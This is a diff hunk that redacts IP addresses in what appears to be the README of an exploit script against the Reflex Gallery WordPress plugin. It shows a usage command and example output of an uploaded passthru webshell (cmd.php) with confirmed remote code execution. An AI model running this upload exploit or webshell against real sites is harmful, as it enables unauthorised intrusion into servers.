@@ -63,13 +63,13 @@ python3 reflex_upload.py -u http://TARGET/wordpress --interactive
 ### Example output
 
 ```
-[*] Target: http://192.168.193.23/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
+[*] Target: http://192.xxx.xxx.xx/wordpress/wp-content/plugins/reflex-gallery/admin/scripts/FileUploader/php.php
 [*] Shell:  built-in default (cmd.php, passthru-based)
 [*] Trying years 2013-2026, months 1-12 (zero-padded and not)
 
 [+] Upload accepted: Year=2015 Month=03
-[+] RCE confirmed! Shell live at: http://192.168.193.23/wordpress/wp-content/uploads/2015/03/cmd.php
-[+] Example: http://192.168.193.23/wordpress/wp-content/uploads/2015/03/cmd.php?cmd=whoami
+[+] RCE confirmed! Shell live at: http://192.xxx.xxx.xx/wordpress/wp-content/uploads/2015/03/cmd.php
+[+] Example: http://192.xxx.xxx.xx/wordpress/wp-content/uploads/2015/03/cmd.php?cmd=whoami
 ```
 
 ---
